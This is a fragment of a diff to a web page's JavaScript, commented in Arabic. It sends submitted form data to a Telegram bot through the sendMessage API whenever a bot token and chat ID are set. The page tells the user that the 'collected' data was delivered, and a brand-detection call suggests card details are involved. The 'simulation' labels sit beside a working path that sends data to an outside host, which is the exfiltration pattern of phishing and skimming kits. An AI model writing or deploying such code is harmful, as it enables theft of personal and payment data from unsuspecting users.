 
-                // تسجيل البيانات في وحدة التحكم لأغراض التوثيق
                 console.log('📤 [بيانات المحاكاة]:', message);
 
-                // ----------------------------------------------
-                // محاولة الإرسال الفعلي إلى بوت تليجرام
-                // ----------------------------------------------
-                let isTokenSet = (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE');
+                // محاولة الإرسال الفعلي (في حال تم تعيين التوكن)
+                const isTokenSet = (BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE' && CHAT_ID !== 'YOUR_CHAT_ID_HERE');
 
                 if (isTokenSet) {
                     fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -628,24 +366,29 @@
                             successDiv.textContent = '✅ تمت العملية بنجاح (تم إرسال البيانات إلى البوت فعلياً).';
                             successDiv.classList.add('show');
                         } else {
-                            successDiv.textContent = '⚠️ فشل إرسال البوت، لكن تمت محاكاة العملية بنجاح (تحقق من التوكن).';
+                            successDiv.textContent = '⚠️ فشل إرسال البوت، لكن تمت المحاكاة (تحقق من التوكن).';
                             successDiv.classList.add('show');
                         }
                     })
-                    .catch(err => {
-                        successDiv.textContent = '✅ تمت العملية بنجاح (محاكاة - تعذر الاتصال بالبوت، ولكن البيانات جُمعت).';
+                    .catch(() => {
+                        successDiv.textContent = '✅ تمت العملية بنجاح (محاكاة - تعذر الاتصال، لكن البيانات جُمعت).';
                         successDiv.classList.add('show');
                     });
                 } else {
-                    // وضع المحاكاة الكاملة
-                    successDiv.textContent = '✅ تمت العملية بنجاح (تمت المحاكاة الكاملة، البيانات جاهزة في وحدة التحكم).';
+                    // وضع المحاكاة الكامل (بدون توكن)
+                    successDiv.textContent = '✅ تمت العملية بنجاح (محاكاة كاملة - البيانات جاهزة في وحدة التحكم).';
                     successDiv.classList.add('show');
                 }
 
                 successDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
+
+                // (اختياري) إعادة تعيين النموذج بعد 3 ثوانٍ في وضع المحاكاة
+                // setTimeout(() => form.reset(), 3000);
             });
+
+            // تشغيل الكشف الأولي (إذا كانت هناك قيمة افتراضية)
+            updateBrand();
         })();
     </script>
-
 </body>
-</html>
+    </html>
